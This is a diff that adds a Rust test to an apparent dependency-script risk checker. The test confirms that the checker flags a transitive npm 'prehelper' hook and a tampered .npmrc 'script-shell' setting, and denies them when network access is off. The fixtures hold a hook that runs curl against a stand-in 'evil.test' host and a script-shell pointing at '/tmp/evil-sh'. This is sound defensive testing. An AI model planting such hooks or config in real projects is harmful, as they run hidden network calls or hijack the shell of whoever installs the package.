@@ -325,3 +325,38 @@ fn verify_plan_exposes_real_binaries_inserts_dash_dash_and_gates_lifecycle_hooks
     assert_eq!(crit_assessment.risk, goon::risk::RiskClass::Critical);
     assert_match(crit_assessment.denied.as_deref().unwrap_or(""), "(?i)critical");
 }
+
+#[test]
+fn verify_plan_surfaces_transitive_script_hooks_yarn_pnpm_and_npmrc_tampering() {
+    let deny_net = goon::policy::ExecutionPolicy::with_mode(goon::policy::NetworkMode::Deny, &[]);
+
+    // Transitive npm script invocation (`test` -> `npm run helper` -> `prehelper` network call).
+    let trans = fixture();
+    trans.write(
+        "package.json",
+        &json!({
+            "scripts": {
+                "test": "node --test && npm run helper",
+                "prehelper": "curl https://evil.test/hook",
+                "helper": "echo ok"
+            }
+        })
+        .to_string(),
+    );
+    trans.write("src/a.ts", "export const a = 1;\n");
+    let trans_plan = plan_verification(&trans.cwd, &strings(&["src/a.ts"]), &cfg(&[], 1000), &policy(true, false, false, true));
+    assert!(trans_plan.commands[0].display.contains("prehelper: curl https://evil.test/hook"), "{}", trans_plan.commands[0].display);
+    let trans_assess = assess_verify_plan(&trans_plan, Some(&deny_net));
+    assert_eq!(trans_assess.risk, goon::risk::RiskClass::High);
+    assert_match(trans_assess.denied.as_deref().unwrap_or(""), "(?i)network");
+
+    // Configured `yarn test` and `.npmrc` `script-shell` tampering elevate verify assessment to High and deny under NetworkMode::Deny.
+    let npmrc_ws = fixture();
+    npmrc_ws.write("package.json", &json!({ "scripts": { "test": "node --test" } }).to_string());
+    npmrc_ws.write(".npmrc", "\u{feff}script-shell = /tmp/evil-sh\n");
+    npmrc_ws.write("src/a.ts", "export const a = 1;\n");
+    let npmrc_plan = plan_verification(&npmrc_ws.cwd, &strings(&["src/a.ts"]), &cfg(&["yarn test"], 1000), &policy(true, false, false, true));
+    let npmrc_assess = assess_verify_plan(&npmrc_plan, Some(&deny_net));
+    assert_eq!(npmrc_assess.risk, goon::risk::RiskClass::High);
+    assert_match(npmrc_assess.denied.as_deref().unwrap_or(""), "(?i)\\.npmrc.*script-shell");
+}
